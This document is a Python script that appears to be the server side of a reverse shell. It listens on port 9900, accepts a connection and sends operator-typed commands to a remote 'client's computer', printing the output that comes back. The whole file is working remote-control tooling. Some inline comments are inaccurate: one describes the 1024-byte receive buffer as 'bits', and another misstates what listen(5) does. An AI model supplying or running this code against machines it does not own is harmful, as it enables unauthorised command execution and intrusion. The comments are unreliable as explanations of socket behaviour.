import socket
import sys


# Create a socket

def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9900
        s = socket.socket()

    except socket.error as msg:
        print("Something went wrong while creating the socket." + str(msg)+"\n")


# Binding Port and Host together and listening for connection


def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port " + str(port)+"\n")

        s.bind((host, port))
        s.listen(5)  # After 5 bad connection s.listen() will throw error

    except socket.error as msg:
        print("Something went wrong while binding the port." + str(msg) + "\n Retrying...")
        bind_socket()


# Establishing connection/Accepting connection with a client (Socket must be listening)

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established, the IP is: " + str(address[0]) + " and the port is: " + str(address[1]) +"\n")
    send_commands(conn)
    conn.close()


# Send commands to client's computer, we are calling this above in socket_accept
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")  # Receive incoming data in chunks of 1024 bits
            # then convert them to utf-8 format so that they could be converted to string
            print(client_response, end="")  # end="" puts the cursor in the terminal on next line


def main():
    print("Starting the server-side script! \n")
    create_socket()
    bind_socket()
    socket_accept()


main()

